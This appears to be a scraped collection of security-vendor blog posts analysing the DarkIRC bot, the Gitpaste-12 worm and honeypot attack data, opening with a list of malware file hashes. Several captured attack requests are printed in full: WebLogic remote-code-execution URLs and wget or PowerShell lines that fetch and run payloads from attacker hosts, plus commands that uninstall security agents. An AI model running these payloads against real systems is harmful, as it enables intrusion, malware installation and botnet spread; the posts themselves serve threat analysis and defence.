X10-unix_mips\r\n7b56e97a7bbbce9ef64d963461773e1300e194554270c03a1d874119890d16b1  X10-unix_mips\r\nbd77b7c710ef1483ce1dc3fcdcc6e966c1328c171e1780e71dbc765ca0144fba  X10-unix_mips\r\naaee1e18e0944c12825c65bd8cf735cc887abc5fbe06a478e3e23e69606f85ce  X10-unix_mips\r\n5e6788591a2066d63ae0a42156131ae9f77a782f0372619346836c9f6be09dab  X10-unix_mips\r\n814b60d82e040def87b791cbfe5c2509f0c1b282ed0cc13f0a8cc245f26c5309  X10-unix_mips\r\nd2a2538e12cf1f607769b60fa98e03b7980b452fb732084bb00c2243b2063dba  X10-unix_mips\r\n2747f2b000d9a0d8019725680ebece51ff171860733ea14cc1649a1c19b4db44  X10-unix_mips\r\n2f7f670840314d702dd7c542f61f4b9d16f4a25eec63757f876363585db7eb4a  X10-unix_mips\r\ndbe96ec3bb2b02897fbe5449f56000bbbec03192922a33e36f4d77431e984853  X10-unix_mips\r\nb70093183d6f920431d5e5134ea5d0ac49c250423cf6e8fbb9ec08d149e0a29b  X10-unix_mips\r\n78b6692a1bd5cb572e8580f70d35387ef8a2f41193dc3dff0c65be87a7bfcb50  X10-unix_mips\r\na0106a0417b2f86bd6d74cee730f3a74aa35e17e20b99f21a327505566a1e321  X10-unix_mips\r\ndcadbce643f0121cbe4dd0ec1e26dd401e23935f3b5743b0bc2a4a509317106b  X10-unix_mips\r\n6d55f8d539662713a756e449e62b1189d2c1940c7a1a7d479981a03dcc117b9f  X10-unix_mips\r\ne249a0bbd8cce16dc71abbe82913bd8bc221b2ffd4187cd95c68b0a1fab45e8b  X10-unix_mips\r\nea925dd08a403f70b9ab23c0c2627a75cabe84e1598b3b478c0722ad7a02798f  X10-unix_mips\r\na6318f4a12503368b3911084ec98bc2807ff9350aab76a178993f450cedfb5ff  X10-unix_mips\r\n4e5137804773228b7715b5c01401a9f1545ad0130f8e1dcb7eb8751d076e0148  X10-unix_mips\r\n1eb354a6cfb705b01cafa67169445d7764ef4c105ae626ad168421dba71f5de9  X10-unix_mips\r\n7ac1d85d1296c2315bea20c31a19cf3e05d2daa5923569d8c89c6ffb05c75605  X10-unix_mips\r\n0a62f5166fa0a165a89be44a51bc163264ece4fb116a6263b115683edb4b5eae  X10-unix_mips\r\ndb977fce0216967e1bad1f9419d4f10e4ab57828dbac84552cad934a6ea59043  X10-unix_mips\r\nfe722b2e79a017080505b084682750117e3696851776f2b63d21e8dc6fae01a1  X10-unix_mips\r\nc5b501d0cd20fa2875f67f450ba2307fa96f2acf6943454853edbdc03c05f94f  X10-unix_mips\r\nc9871eab1b447a56fb0df1b59ca8581a3949477c33d6c06ea7c2dc411555f6ec  X10-unix_mips\r\n329aac742c903d0c134d8f63b8582f2e83933c79adca2e0945551ea4a7b5d5fd  X10-unix_mips\r\n30d6bbd27426ad3ed2dfda3271451ad5bd07364c396858dc227c824cdab98a29  X10-unix_mips\r\nac108a5bab5f08684cea9381644730e815681fcaaef01402009ff9d83cea1781  X10-unix_mips\r\n58649aabec533011defd49c16ad64abc142c61958c833ffc8694cffa0cca8717  X10-unix_mips\r\nc7c3eb6aeef5c4dad26e0104ce7f8c7752965c1884a76743980ddd776f6d3610  X10-unix_mips\r\n49c4479e27498985fee7353d927b569fde42974fd507ab74881212016da6576c  X10-unix_mips\r\ncf59d5fe833ec5221c09e0e51840a38d9e1a557f82481acd3a379ba73e2baa3b  X10-unix_mips\r\n934debfee6966ad1eeb7487339ac90a3724f67c328bfc0177a03c3c3571f80f4  X10-unix_mipsb64\r\ne11b56f0e1251aaba1df3ecd3304e93f1b1c4fec6b64c1e0ac41bd6b501a34ac  X10-unix_mipsb64\r\nf047b9a068c490bf3c4600445497002c65761642fe0ed5fdb70fe8196ff719d0  X10-unix_mipsb64\r\nb223c4ad8a383eb9cfda4a0f660a9ab151e025a239b6a74f21b9b172f3a87626  X10-unix_mipsb64\r\n0ddabc9bc4862a9a6a1f7bab924068016c515fc2621534179502bc3aee7abb79  X10-unix_mipsb64\r\n3fb5f7969623ad46bc5f4e7c8ddf2a2332345799b2916fe14fe44aaa9eff3e08  X10-unix_mipsb64\r\n52a7dd46bb2f922d97e0c6d16a7150b6c4ea667a696b9f67c6d3e2618750c8dc  X10-unixb64\r\n059367197abddef4a1f9f99b5ebb3912351575253801f4b14d612450d85c9a9d  X10-unixb64\r\n6fb36e3d97ed49410855b1d5214af96e46b3b676f7c720903c4f6213229da429  X10-unixb64\r\n6b00ebce8f6663dbbe83e722280749d630b2f298d3494589bbbac068a3660801  X10-unixb64\r\n1a27b77ea4e018d468e9ec040138ca3a3909bf54db78576cca2378d1292b90a4  X10-unixb64\r\nae6c6c4a9fdbd30f195dfc0bab590527e87ce5228e41456814ca09db8bb27367  X10-unixb64\r\ne67f78c479857ed8c562e576dcc9a8471c5f1ab4c00bb557b1b9c2d9284b8af9  X11-unix\r\na874d78bd870c9dfd4c9db28b104bb344a874a1b7dfc471e22df13f5666b7090  aruba.so\r\ncd35f199ab47bd17576184dd0ab6f5e4cc446e3c183f187b13064d13db4cdd64  aruba.so\r\ndfca392104613c1a2fc8723d85946f81bb9fefedf30b6f5cfbe83e1c106f773a  aruba.so\r\nc3c32ebebf9212450aac7a751cd6094520e3cfec1e4111c15b197f3f77ca486a  base64\r\n37e55f68a45f1f5b8a2c5552b4a8dbc8c1cc139b95dcc22e7fca33ff56b83c1e  blu\r\naf41ff8098bbb82d80e24be7bf0f59368f1cfe34f5efff66342d09308019216c  bluarmb64\r\n0227fd788e90cf9ce6705264dd2aeea2f1dc5249a829b9e67d435cad94022aa5  blub64\r\ndb7757c90384d76baefb5f7b8300663872a1cbe27d5d68b70f100166a46d8ec0  blumipsb64\r\n65e9cb2343ce1400c596e1aa372e50923f35b3f120bc8066bd222d4f577808a7  cmds.sh\r\nbd5e9fd8215f80ca49c142383ba7dbf7e24aaf895ae25af96bdab89c0bdcc3f1  config.json\r\n30efb79d423b0d50a5053f3c9293c42089929f0fde31a542813489376c581d27  config.json\r\n05bdc15f2905cacc339c05c186ec22c0f2015aff540942158a29343150b046d9  config\r\n597798964dd5f36219133f3b2b4f15c91550aa82f481f60fd4b75f8987a26e1e  do\r\n7ce8ade9ee1336a75ef9b3ecf9b20e5a77acb6d78cf9cfc2fed772912bdfbf19  exp.so\r\ned4868ba445469abfa3cfc6c70e8fdd36a4345c21a3f451c7b65d6041fb8492b  hide.so\r\n0656e44fb8a85499025d6d7fce27b17b41c462a39567a7fd57c3106852e8094a  hide.so\r\n8536cf04866e87504e228148fd8eadea02c3acc787f0f4e825f4d2b4d4ae188c  hide.so\r\nc877f204a8d3422d496d42b76a194a6676924360c5a803f433e2674adc94ddc4  hide.so\r\ndb5511fc606a83699d526e5276c6525ef2bb19704660296dc4836ab141efb489  hide_arm.so\r\n144aee1c689e6deb9ce48db169b68ea17037a1c9bd54bf7c217f0e4ccd67406d  hide_armb64\r\nc60476a36a8d3fc454442f8d11b898a13b019bb00401518fd281ff4b4633d111  hideb64\r\n5b1ec1f59ba8de847cb361489e3d25c0c8f860853f11ef2b69402e8346b6bd73  hidemipsb64\r\ne20001a95063f5c5bad77bb88fa3c659b30406626d945431c40a66c926cb14c8  mipsld.so\r\n4f20d54195ac5e9bfcacf8184760393a0522f2b0d3f653d78fbb08b6f999cb4f  shadu1\r\ndfa1a3c0d1e79a243a36463d49e4783a54997243c965da3ec67c25858403d8b2  ss.exe\r\n3fc6e623515bff1dd19eb3e8bd10e8a4a473dfaf6ef08162a10a59f370b7a0b1  ss.exe\r\n98e45704bedb2fc5a4df626673e58f593394f062b7f5378e28e36a07bd656313  ss.exeb64\r\n0a58e7b6cf994721fc0c759a2e5b21ec297817b336d369c8c790da0ae95f2b35  ss.exeb64\r\n33f1c0cd835b865f54bc3fb5c6e48bfbfc9b315a450da773e5a42a0726cfa45f  ss.exeb64\r\n846556acb01c5c40b55143f65e6951794cd6f0c2df9607bcb7f185bb1fda0528  ss\r\n65960b33213f5a282823b7192566c5c17a3f4d851a14d02676fc517c0442d9bf  ss\r\n002665b24eb627823ba6b312c8263e40ccbac7e750b33a0cabf54d9ed2e4d05f  ss\r\n354ee27268d90b9a6b57434bfec321205de05d8a08b99c25ce0923a275e20470  ss\r\n5047946bb5d2b1e01881034e445acea85c0543047a012a47bc12b34ee9d1aff2  ss_arm\r\n97a3c455e252d30da61904421d227ec1cad97805fe0ce8c5d6e00a38d5d7cd89  ss_arm\r\n6a8bd2b4bd371919908b89255aad26d7bc56326f8c4a41001ef3552767623861  ss_arm\r\n8b08e19b960db9389cc5c623a159476fcf28d1aab36a75be1b83f3ad05b14bf5  ss_armb64\r\n72a4253b46252614ae546cc1bc32411ec81ea307fb04ed1defa6d1d0bdd5458d  ss_armb64\r\nd5d14ed8a38b42aab1dee88a4cfc701748a4bf6c0e29092bc2d2d153ee93ff4e  ss_armb64\r\ne22bf0a73beed79de601b5824e98a23ba4a05b1876b20b5dabd55dcd5ccc6bfb  ss_mips\r\nfcea380d2c58c2ad1efcab801ed255be8c88fb3789a8b378545012b90795b301  ss_mips\r\n0ea794c35d2b1006efb8b957924099ff1ca5ff282ceb6752c128477736f1b267  ss_mips\r\ne6a599ac2a440d75bb795c0dd7ecbfb287bb60dae1b456ffdae4411dd216562a  ss_mipsb64\r\n2042601272b571e51ffa0953ca309ffbccc1409575f6c0a127713eb301a60318  ss_mipsb64\r\n9fcc3e39ccad2a17b9976de7acfb98f47ab3870da55eabf1414b0dd337d94aee  ss_mipsb64\r\n45fa1f99165c01e5bd7df025c663537045e40967104f73ad14599549a4fc2974  ssb64\r\n9395f1ed387513041ff04047e97f5cc8d67e62919505a210fed52f285f22f887  ssb64\r\n11eaffbd383739aec7a4b65cbf3cc4e3b4af151d060d051c37d4efe21243a689  ssb64\r\n9901ea7f0941e8d4b4d0ada1da6faa71684d7a8b35029973694bdbea25a8cbfa  sudo\r\nb57b7f84152de94af3b83134d70353502b0a22d3b3c24d0820aa94a0236e4726  sudob64\r\n89c1cb2f2f77a779bb388830d86bd325411e1a8289fbb15aef8f35a3a1a694b5  u.sh\r\n65e9cb2343ce1400c596e1aa372e50923f35b3f120bc8066bd222d4f577808a7  u.sh\r\n1fd5edd97359ad103e15e335cc3b3153ccb19e865a3570eaaf4703d176e6fc2d  weixin.apk\r\n745fbf9a9a5139c3b279cc80433e5aab8439d059fd73124b8a1219d41ca12a99  weixin.apk\r\n74a0e3044a63984a1bd21686fe6d4759c463dda07d24cc9df5598ec11658681e  weixin.apk\r\n745fbf9a9a5139c3b279cc80433e5aab8439d059fd73124b8a1219d41ca12a99  微信.apk"}}
{"https://blogs.juniper.net/en-us/threat-research/darkirc-bot-exploits-oracle-weblogic-vulnerability": {"metadata": {"dateAccessed": "2021-07-27", "dateCreated": "2020-12-01", "source": "blogs.juniper.net"}, "text": "Juniper Threat Labs is seeing active attacks on Oracle WebLogic software using CVE-2020-14882. This vulnerability, if successfully exploited, allows unauthenticated remote code execution. As of this writing, we found 3,109 open Oracle WebLogic servers using Shodan. We are seeing at least five different variants of attacks/payload. For the purpose of this blog, we will focus on one particular payload that installs a bot called DarkIRC. This bot performs a unique command and control domain generation algorithm that relies on the sent value of a particular crypto wallet. This bot is currently being sold on hack forums for $75USD. Open Oracle Weblogic servers on the internet DarkIRC DarkIRC version The attack issues an HTTP GET request to a vulnerable WebLogic server, which will execute a powershell script to download and execute a binary file hosted in cnc[.]c25e6559668942[.]xyz GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession\r\n(%22java.lang.Runtime.getRuntime().exec('powershell%20-NoP%20-NonI%20-W%20Hidden%20-Exec%20Bypass%20%22\r\n(New-Object%20System.Net.WebClient).DownloadFile(%22http://cnc.c25e655{redacted}xyz/svchost.exe%22,%22$env:temp%0Degsvc.exe%22);\r\n%20Start-Process%20%22$env:temp%0Degsvc.exe%22%22');%22); HTTP/1.1\r\n\r\nHost: {redacted}:7001\r\n\r\nConnection: keep-alive\r\n\r\nAccept-Encoding: gzip, deflate\r\n\r\nAccept: */*\r\n\r\nUser-Agent: python-requests/2.24.0 The source IP is 83.97.20.90. This IP resolves to the C&C of this bot which means the attacker IP is the same as the C&C. The sha256 hash of the payload is d78c90684abcd21b26bccf4b6258494a894d9b8d967a79639f0815a17e1e59a5. This payload is a .NET file with a file size of 6MB, fairly encrypted and has the following properties: Basic structure of the crypter The Crypter The crypter or the packer is being used primarily to conceal its true intention and avoid detection. It also includes anti-analysis and anti-sandbox functions. It tries to detect if it is running under the following virtualized environments to determine if it should  not continue its malicious routine: VMware VirtualBox VBox QEMU Xen If it is not, it will load an encrypted file in its resource. DarkIRC Crypter virtual environment check After unpacking, we can clearly see what this malware wants to do, based on the name of its functions. Functions inside DarkIRC when unpacked Bot Functions The bot installs itself in the %APPDATA%\\Chrome\\Chrome.exe and creates an autorun entry. Among its functions include: Browser Stealer Keylogging Bitcoin Clipper DDoS Slowloris RUDY (R-U-DeadYet?) TCP Flood HTTP Flood UDP Flood Syn Flood Worm or spread itself in the network Download Files Execute Commands Bitcoin Clipper This function allows the malware to change the copied bitcoin wallet address to the malware operator’s bitcoin wallet address. This essentially allows it to steal bitcoin transactions on the infected system. This is similar to what Masad Stealer does. DarkIRC clipping routine Bitcoin address by the malware operator: 3QRwJwLRFDBoeLZ2cToGUsdBGB3eqj3exH It connects to its Command and Control via IRC with an added encryption XOR encryption. CnC communication is encrypted via XOR Below are the bot commands: Command Action steal Steal browser passwords mssql Spread via mssql (brute force) stopall Stop all flood attacks rudy Start or stop rudy flood attacks. If command includes stop, it means stop rudy attacks. rdp Spread via RDP (brute force) update Update this bot upload Upload files dlexerem Download, execute and remove udp Start/Stop udp flood attacks version Get version info of the infected system dlexe Download and execute username Get username of the infected system cd Set current directory getip Get IP address of the infected system md5 Get config md5 of bot usbspread Spread via USB tcp Start/Stop tcp flood attack discord Steal discord token botversion Get bot version syn Syn flood http Http flood slowloris Slowloris DDoS attack uninstall Uninstall itself smb Spread via SMB cmd Run command Command and Control DGA One of its interesting functions is to generate a domain, based on the value of a particular dogecoin wallet, DHeMmdtVhMYQxjbhe2yKvm8nbjSx1At6cZ It hashes the sent value of the wallet and gets the first 14 characters of the hash to complete the cnc domain below: cnc .<generated hash[:14].xyz> At its current value, the resulting domain will be: cnc[dot]c25e6559668942.xyz DarkIRC uses a DGA that depends on the sent value of a particular dogecoin wallet The URL request returns a json formatted string, which includes the amount “sent” from that wallet. Current sent value of the wallet that the DGA relies on. In the event that the existing domain is taken down, the malware operator could make a transaction that will change the “sent” value from the wallet, which will generate a new cnc domain for all the bots. Who is behind this? We found an account in Hack Forums by the name of “Freak_OG” that advertised this botnet back in August 2020 for $75USD. Threat actor advertising on hack forums. On November 1, the same account posted a FUD (Fully Undetected) Crypter, selling it for $25USD. The filename of the file he is showing in this post resembles the “Application Name” of our payload, WindowsFormsApp2.exe. Threat actor advertising it’s crypter We are not certain if the bot operator who attacked our honeypot is the same person who is advertising this malware in Hack Forums or one of his/her customers. Conclusion Threat actors will always be on the hunt for victims. One of the fastest ways for them to be victimized is to use a zero day exploit and attack the internet, usually via a spray-and-pray technique. This vulnerability was fixed by Oracle in October and a subsequent out of cycle patch was also released in November to fix a hole in the previous patch. We recommend affected systems to patch immediately. Oracle WebLogic RCE attacks Below is brief information about the different attacks we have seen from our sensors and the payloads they try to install. Attack Variant 1: Cobalt Strike Payload Attacker IP 45.77.178.169 Attack Port 7001 IOC 139[.]180.194.87 GET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread%20currentThread%20=%20\r\n(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20\r\n=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);\r\nweblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);\r\n%20String%20cmd%20=%20req.getHeader(%22cmd%22);String%5B%5D%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String%5B%5D%7B%22\r\ncmd.exe%22,%20%22/c%22,%20cmd%7D%20:%20new%20String%5B%5D%7B%22/bin/sh%22,%20%22-c%22,%20cmd%7D;if(cmd%20!=%20null%20)%7B%20String%20result%20=%20new%20java.util.Scanner\r\n(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22%5C%5CA%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20\r\n(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream\r\n(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();%7D%20currentThread.interrupt();') HTTP/1.0\r\n\r\nUser-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\r\n\r\nAccept-Encoding: gzip, deflate\r\n\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\r\nConnection: keep-alive\r\n\r\ncmd: powershell -ENC DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbgAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AA0ACgAgA{redacted} The powershell script executes a shellcode, which downloads from http://139[.]180.194.87:2233/LkQT. The URL did not return anything during our test. Based on threat intelligence, this IP is related to Cobalt Strike. Shellcode downloading Cobalt Strike Attack Variant 2: Perlbot Payload Attacker IP 85.248.227.163 Attack Port 7001 Payload Hash ef7df0f86ed1a1bca365d7247d60384ece4687db28e5ec9aee1a61b1cfa4befa POST /console/css/%252e%252e%252fconsole.portal HTTP/1.0 User-Agent : Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0 Accept-Encoding : gzip, deflate Accept : */* Connection : keep-alive Content-Type : application/x-www-form-urlencoded cmd : unset HISTFILE;unset HISTSAVE;wget http://159.69.66.124/bo;perl bo;rm -rf bo Content-Length : 1216 _nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession\r\n( 'weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();\r\nweblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();java.lang.reflect...{redacted} Attack 3: Meterpreter Payload Attacker IP 185.65.134.178 Attack Port 7001 Payload Hash 4bafb11609f744948f7adbba60b8f122906d6cb079b1a1f3b9ba82f362e03889 POST /console/css/.%252e/console.portal HTTP/1.1 Host : {redacted}:7001 User-Agent : Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Content-Type : application/x-www-form-urlencoded Content-Length : 2304 handle=com.tangosol.coherence.mvel 2 .sh.ShellSession %28%27 java.lang.Runtime.getRuntime %28%29 .exec %28 new %20 java.lang.String %28 java.util.Base 64 .getDecoder %28%29 .decode %28%22 cG 93 ZXJzaGVsbCAtdyBoaWRkZW 4 gLW 5 vcCAtYyAkYT 0 nMTg 1 LjY 1 LjEzNC 4 xNzgnOyRiPTg 3 Nzc 7 JGM 9 TmV 3 LU 9 iamVjdCBzeXN 0 ZW 0 ubmV 0 LnNvY 2 tldHMudGNwY 2 xpZW 50 OyRuYj 1 OZXctT 2 JqZW\r\nN 0 IFN 5 c 3 RlbS 5 CeXRlW 10 gJGMuUmVjZWl 2 ZUJ 1 ZmZlcl{redacted} Attack 4: Mirai Payload Attacker IP 83.97.20.90 Attack Port 7001 Payload Hash 81d51082566d3cebbc8d0d3df201a342f8056efbfb95a7778b6f5d56a264fb07 GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&\r\nhandle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec\r\n('wget%20http://83[dot]97.20.90/mirai.x86%20-O%20/tmp/kpin;chmod%20777%20/tmp/kpin;/tmp/kpin');\r\n%22); HTTP/1.1 Host : {redacted}:7001 Connection : keep-alive Accept-Encoding : gzip, deflate Accept : */* User-Agent : python-requests/2.24.0 Content-type : application/x-www-form-urlencoded; charset=utf-8 The exploit is detected by IDP as “ HTTP:ORACLE:WLOGIC-UNAUTH-RCE”. Juniper Advanced Threat Prevention (ATP) detects this file."}}
{"https://blogs.juniper.net/en-us/threat-research/gitpaste-12": {"metadata": {"dateAccessed": "2021-07-27", "dateCreated": "2020-11-05", "source": "blogs.juniper.net"}, "text": "Gitpaste-12 is a new worm recently discovered by Juniper Threat Labs, which uses GitHub and Pastebin for housing component code and has at least 12 different attack modules available. There is evidence of test code for possible future modules, indicating ongoing development for this malware. For now, however, targets are Linux based x86 servers, as well as Linux ARM and MIPS based IoT devices. This malware has been dubbed Gitpaste-12 because of the usage of GitHub, Pastebin and 12 ways to compromise the system. The first GitPaste-12 first attacks were detected by Juniper Threat Labs on October 15, 2020. We’ve reported both the Pastebin URL and the git repo in question and the git repo was closed on October 30, 2020. This should stop the proliferation of this botnet. The GitHub repository used at the time of discovery was as follows: https://github[.]com/cnmnmsl-001/- First commit Thu Jul 9 21:07:06 2020 Last commit Oct 27, 2020 Anatomy of Gitpaste-12 The first phase of the attack is the initial system compromise (note the details of compromises used by this worm will be discussed later in this piece). This worm has 12 known attack modules and more under development. The worm will attempt to use known exploits to compromise systems and may also attempt to brute force passwords. Immediately after compromising a system, the malware sets up a cron job it downloads from Pastebin, which in turn calls the same script and executes it again each minute. This is presumably one mechanism by which updates to the cron jobs can be pushed to the botnet. The main shell script uploaded during the attack to the victim machine starts to download and execute other components of Gitpaste-12. First, it downloads and sets up cron job, which periodically downloads and executes script from Pastebin: Next, it downloads from GitHub ( https://raw.githubusercontent[.]com/cnmnmsl-001/-/master/shadu1 ) and executes it. The malware begins by preparing the environment. This means stripping the system of its defenses, including firewall rules, selinux, apparmor, as well as common attack prevention and monitoring software. The shadu1 script contains comments in the Chinese language and has multiple commands available to attackers to disable different security capabilities, as discussed above. The following example has some commands that disable cloud security agents, which clearly indicates the threat actor intends to target public cloud computing infrastructure provided by Alibaba Cloud and Tencent. Examples of these commands include: curl http://update.aegis.aliyun.com/download/uninstall.sh | bash\r\ncurl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash\r\n/usr/local/qcloud/stargate/admin/uninstall.sh\r\n/usr/local/qcloud/YunJing/uninst.sh\r\n/usr/local/qcloud/monitor/barad/admin/uninstall.sh Another capability is demonstrated in the ability to run miner for monero cryptocurrency with the following config: { “background”: true, “log-file”: null, “access-log-file”: null, “retries”: 50, “retry-pause”: 5, “donate-level”: 2, “coin”: “xmr”, “custom-diff”: 0, “syslog”: false, “verbose”: false, “colors”: true, “workers”: true, “pools”: [ { “url”: “donate.v2.xmrig.com:5555”, “user”: “41qALJpqLhUNCHZTMSMQyf4LQotae9MZnb4u53JzqvHEWyc2i8PEFUCZ4TGL9AGU34ihPU8QGbRzc4FB2nHMsVeMHaYkxus”, “pass”: “x” } ], “bind”: [ “0.0.0.0:12388” ], “api”: { “port”: 0, “access-token”: null, “worker-id”: null }} The Gitpaste-12 malware contains the library hide.so and is loaded as LD_PRELOAD. Hide.so updates the crontab file to download and execute https://pastebin[.]com/raw/Tg5FQHhf. It also prevents administrators from collecting information about running processes by intercepting “readdir” system calls and skip directories for processes like tcpdump, sudo, openssl, etc. in “/proc”. The “/proc” directory in Linux contains information about running processes. It is used, for example, by the “ps” command to show information about running processes. But unfortunately for this threat actor, this implementation does not do what they expect it to do. Worming Capability The Gitpaste-12 malware also contains a script that launches attacks against other machines, in an attempt to replicate and spread. It chooses a random /8 CIDR for attack and will try all addresses within that range, as demonstrated by this call: while true;do awk -va=\\$((\\$RANDOM%128)) ‘BEGIN{for(b=0;256>b;b++) for(c=0;256>c;c++) for(d=0;256>d;d++) system(\\”./sh \\”a\\”.\\”d\\”.\\”c\\”.\\”b\\” And here we can see the worm attempting to spread: Another version of the script also opens ports 30004 and 30005 for reverse shell commands: Gitpaste-12 Exploits Gitpaste-12 uses 11 vulnerabilities and a telnet brute forcer to spread. Known vulnerabilities include: CVE-2017-14135 Webadmin plugin for opendreambox CVE-2020-24217 HiSilicon based IPTV/H.264/H.265 video encoders CVE-2017-5638 Apache Struts CVE-2020-10987 Tenda router CVE-2014-8361 Miniigd SOAP service in Realtek SDK CVE-2020-15893 UPnP in dlink routers CVE-2013-5948 Asus routers EDB-ID: 48225 Netlink GPON Router EDB-ID: 40500 AVTECH IP Camera CVE-2019-10758 Mongo db CVE-2017-17215 (Huawei router) Conclusion No malware is good to have, but worms are particularly annoying. Their ability to spread in an automated fashion can lead to lateral spread within an organization or to your hosts attempting to infect other networks across the internet, resulting in poor reputation for your organization. Juniper Connected Security customers using SRX IDP and Juniper ATP Cloud are protected against Gitpaste-12. IOCs Some compromised systems have TCP ports 30004 and 30005 open for shell commands. Miner: e67f78c479857ed8c562e576dcc9a8471c5f1ab4c00bb557b1b9c2d9284b8af9 hide.so: ed4868ba445469abfa3cfc6c70e8fdd36a4345c21a3f451c7b65d6041fb8492b Miner config: bd5e9fd8215f80ca49c142383ba7dbf7e24aaf895ae25af96bdab89c0bdcc3f1 Shell script: 5d1705f02cde12c27b85a0104cd76a39994733a75fa6e1e5b014565ad63e7bc3"}}
{"https://blogs.juniper.net/en-us/security/junipers-attacker-ip-feed-bolsters-threat-protection-with-secintel": {"metadata": {"dateAccessed": "2021-07-27", "dateCreated": "2020-10-08", "source": "blogs.juniper.net"}, "text": "Juniper Threat Labs (JTL) has a network of sensors throughout the world that we use to monitor cyber security threats. These threats can range from Brute Force attacks against logins, such as SSH, FTP, telnet and RDP, to more sophisticated attacks against SMB, Citrix and databases.  The JTL sensors are designed to mimic the majority of common operating systems currently on the internet in both up-to-date patched and unpatched systems. These sensors are located in every continent, with the exception of Antarctica, and focus on locations that might be tempting to attackers, as well as locations that are a focus for certain threat groups. We monitor the attack locations and look for trends of which locations have become a hotbed of activity. The map below is an example of attacks happening in real-time, showing the point of origin of attacks against the Juniper Threat Labs’ sensors. Juniper Threat Labs also employs various types of sensors within its intelligence network. These sensors pick up numerous attacks on all 65,535 different network ports. We see the well-known ports attacked regularly, but threat actors commonly spread their attacks across the entire fourth layer of the TCP/IP stack. This chart shows the spread of attacks across one set of sensors over a seven day period. The sensors are rotated out regularly to provide a larger footprint for potential attackers, as well as to prevent attackers from identifying these sensors as research devices. Using these sensors, we see attacks that range from simple IoT device attacks, such as this attack targeting a common Digital Video Recorder using the Mirai botnet. GET /shell?cd+/tmp;rm+-rf+*;wget+192.3.67.106/beastmode/b3astmode.arm7;chmod+777+/tmp/b3astmode.arm7;sh+/tmp/b3astmode.arm7+BeastMode.Rep.Jaws HTTP/1.1 User-Agent: Hello, world Host: 127.0.0.1:80 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Connection: keep-alive Currently, Mirai is one of the most common botnets we are seeing attack IoT devices.  Variants of Mirai have developed with over 70 different vulnerabilities and rising. Some popular variants like Okiru, Masuta and IoTroop (and, most recently, SORA, UNSTABle Hoaxcall or Mirai XTC) are making the rounds. While there are some guesses as to the number of variants of Mirai, no one can be certain of how many different developers have taken the code and made it their own. We also see daily brute force attacks against numerous different software packages. One of the most common is MSSQL database. The attack shown below is one of the thousands of different brute force attacks we see on a daily basis. Mssqla5yqbm5,mo`~!@ ~#$%^&*(),.; 000000a0 ��, squelda 1.0 5yqbm5,mo`~!@ ~#$%^&*(),.; MSDBLIB Juniper SecIntel offers curated threat intelligence that is continuously updated, actionable and validated by Juniper Threat Labs. This includes a Command and Control (CnC) feed that provides Command and Control IPs that attackers are using to establish persistence, control malware or maintain their connection to your network. We also recently added a new Attacker IP feed that contains IPs that were seen attempting to compromise our sensor network to establish the persistence that the attacker is seeking to maintain. IPs are collected within a broker, then separated into attack threat types and aggregated into various categories that will be used to enhance this feed, as well as create new feeds that can be acted on via Juniper firewalls and routers. Each attacker IP is assigned a threat value from 1 -10, with 10 being the highest severity. As time goes on, if no additional malicious activity is seen by our sensors from a particular IP, its threat level will wane and then drop off completely. The IPs that are harvested from these sensors are then automatically vetted and cross-referenced with a DNS threat feed that maps out related domains, IPs and infrastructure to mitigate potential false positives. This will also include reputation data from other companies and partners who are participating in research to identify insecure or compromised systems on the internet. To take advantage of the new Attacker IP feed, make sure to have the SecIntel service configured on the SRX to protect against inbound traffic. Step 1) Check to see the feed is enabled in the ATP Cloud Portal. Step 2) Create a Threat Prevention Policy that will permit, block and log IPs, URLs and domains of a certain threat level. The example below uses Juniper best practices and permits from threat level 1-4, logs from 5-7 and then blocks from 8-10. Step 3) Create a security policy for the SRX Series firewall that uses the SecIntel feature on inbound traffic from the internet. In closing, while Juniper Threat Labs has considerable visibility into attacks in the wild, we want to emphasize that no security vendor has full visibility into every attack or every threat actor active on the internet. That is why we partner with many third parties to gain a better visibility into the big picture, including the Cyber Threat Alliance where we share our intelligence and we gain insight from other security vendors. Our priority is to protect our customers networks and make the internet a safer place for everyone."}}
